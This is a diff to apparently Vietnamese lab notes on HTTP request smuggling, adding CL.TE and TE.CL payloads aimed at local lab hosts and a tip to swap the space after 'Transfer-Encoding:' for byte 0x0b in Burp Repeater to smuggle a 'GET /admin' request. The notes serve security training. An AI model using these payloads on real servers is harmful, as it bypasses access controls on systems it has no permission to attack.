@@ -22,10 +22,11 @@
 - **Frontend:** Xử lý Content-Length
 - **Backend:** Xử lý Transfer-Encoding
 - **Payload**
-```GET /hello HTTP/1.1
+```
+GET /hello HTTP/1.1
 Host: 0.0.0.0:8001
 Content-Length: 44
-Transfer-Encoding:chunked
+Transfer-Encoding: chunked
 
 0
 
@@ -33,6 +34,7 @@ GET /admin HTTP/1.1
 Host: 0.0.0.0:8001
 
 ```
+- Ở Repeater: Vào **Hex** --> chuyển space (20) ở sau dấu (:) **Transfer-Encoding** thành **0b** --> Send **2 lần**
 
 ### Lab 2: TE.CL 
 - **Endpoint:** http://<IPVM>:8082
@@ -55,6 +57,7 @@ Host: 0.0.0.0:8002
 
 GET /hello HTTP/1.1
 Host: 0.0.0.0:8002
+
 
 ```
   
